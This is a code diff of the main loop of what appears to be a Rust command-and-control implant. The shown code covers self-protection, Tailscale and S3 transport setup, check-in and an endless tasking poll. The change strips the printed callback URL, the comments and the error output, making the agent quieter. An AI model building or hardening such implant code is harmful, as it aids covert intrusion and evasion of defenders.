@@ -49,31 +49,21 @@ fn main() {
 
     selfprotect::set_process_security_descriptor();
 
-    println!("URL: {}", config::callback_host);
-
-    // Tailscale initialization (join tailnet before any communication)
     #[cfg(feature = "tailscale")]
     if config::use_tailscale {
         loop {
             match tailscale_transport::init() {
                 Ok(_) => break,
-                Err(e) => {
-                    eprintln!("[TS] Tailscale init failed: {}, retrying...", e);
-                    helpers::idle();
-                }
+                Err(_) => { helpers::idle(); }
             }
         }
     }
 
-    // S3 bootstrap registration (get per-execution IAM credentials)
     if config::use_s3 {
         loop {
             match s3_transport::register() {
                 Ok(_) => break,
-                Err(e) => {
-                    eprintln!("[REG] Registration failed: {}, retrying...", e);
-                    helpers::idle();
-                }
+                Err(_) => { helpers::idle(); }
             }
         }
     }
@@ -81,9 +71,7 @@ fn main() {
     checkin::checkin();
 
     loop {
-        if let Err(e) = tasking::getTasking() {
-            eprintln!("Tasking error: {}", e);
-        }
+        let _ = tasking::getTasking();
         helpers::idle();
     }
 }
